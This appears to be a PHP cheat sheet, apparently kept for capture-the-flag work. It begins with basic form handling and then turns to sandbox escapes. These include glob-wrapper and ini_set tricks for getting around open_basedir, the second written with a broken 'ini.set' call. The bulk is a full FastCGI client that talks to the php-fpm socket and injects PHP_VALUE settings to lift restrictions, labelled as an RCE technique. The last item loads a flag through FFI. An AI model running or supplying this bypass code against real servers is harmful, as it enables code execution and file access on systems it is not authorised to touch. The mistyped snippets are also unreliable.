# PHP Commands
* All of inputs in the form tag inside HTML are submitted as a dictionary with name as the dictionary key

* Check if a form has been submitted via `POST` method
```php
if (isset($_POST['submit'])){ // submitted }
```

* Get the value of a variable in the submitted form
```php
$_POST['VARIABLE']
```

* Similar syntax applies to the `GET` method, however, the `GET` variables will now be visible inside URL and added inside, separated with `&`

* `REQUEST` basically is a black box that you can use either `POST` or `GET`, and it cab have the effect of either

* To require a `PHP` file inside `HTML`
```php
<?php require_once 'index.php' ?>
```

* `${}` is the value of the referenced variable.
```php
$name = "Cat";          // name => "Cat";
${$name} = "Dog";       // name => "Cat"; $Cat => "Dog";
${${$name}} = "Monkey"; // name => "Cat"; $Cat => "Dog"; $Dog => "Monkey";
```

* Shows a file content
```php
highlight_file("index.php");
```

* Bypass `open_basedir` via glob wrapper, this leads to directory listing of `/`, root directory
```php
foreach(new DirectoryIterator("glob:///*") as $f) echo "$f\n";
foreach(new DirectoryIterator("glob:///tm?/*") as $f) echo "$f\n"; // getting file listing under /tmp/
foreach(new GlobIterator("/*") as $f) echo "$f\n";
```

* Bypass `open_basedir` by changing the `open_basedir` with `ini_set`, IF THIS IS NOT DISABLED
```php
ini.set('open_basedir', '..');
chdir(".."); chdir(".."); chdir("..");
ini.set('open_basedir', '/');
```

* Trying to bypass `disabled_functions` and `open_basedir` using `fpm`, still testing
```
$params = array(); $params['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME']; $params['SCRIPT_FILENAME'] = $_SERVER['SCRIPT_FILENAME']; $params['REQUEST_METHOD'] = 'GET'; $params['QUERY_STRING'] = 'stop=true'; $params['PHP_VALUE'] = 'open_basedir=/'; $params_encoded = ''; print_r($params); foreach ($params as $k=>$v) { $params_encoded.= chr(strlen($k)).chr(strlen($v)).$k.$v; } $len = strlen($params_encoded); $len_encoded = chr($len >> 8).chr($len & 255);
$fp = fsockopen('127.0.0.1',19260); fwrite($fp, "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"); fwrite($fp, "\x01\x04\x00\x01".$len_encoded."\x00\x00".$params_encoded); fwrite($fp, "\x01\x04\x00\x01\x00\x00\x00\x00"); fwrite($fp, "\x01\x05\x00\x01\x00\x00\x00\x00"); sleep(2); $result = ''; while (!feof($fp)) { $result .= fread($fp, 1024); } fclose($fp); $matches = array(); preg_match('/START.*END/s', $result, $matches); echo $matches[0];
```
```php
echo 123;
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;

    private $_sock = null;
    
    private $_host = null;
    
    private $_port = null;
   
    private $_keepAlive = false;
    
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    private function connect()
    {
        if (!$this->_sock) {
            $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    public function request(array $params, $stdin)
    {
        $response = '';
        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        fwrite($this->_sock, $request);
        do {
            $resp = $this->readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                $response .= $resp['content'];
            }
        } while ($resp && $resp['type'] != self::END_REQUEST);
        if (!is_array($resp)) {
            throw new Exception('Bad request');
        }
        switch (ord($resp['content']{4})) {
            case self::CANT_MPX_CONN:
                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $response;
        }
    }
}

$connect_path = 'unix:///var/run/php-fpm.sock';
$port = -1;
$filepath = '/var/www/html/index.php';
$req = '/' . basename($filepath);
$uri = $req;
$client = new FCGIClient($connect_path, $port);
$php_value = "allow_url_include = On\nopen_basedir = /";
$params = array(       
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'GET',
        'SCRIPT_FILENAME'   => $filepath,
        'SCRIPT_NAME'       => $req,
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => 'kaibro-fastcgi-rce',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        );
echo "Call: $uri\n\n";
echo $client->request($params, NULL);
```

* Load a file with FFI
```php
$ffi = FFI::load('/flag.h');
$a = $ffi->flag_fUn3t1on_fFi();
var_dump(FFI::string($a));
```
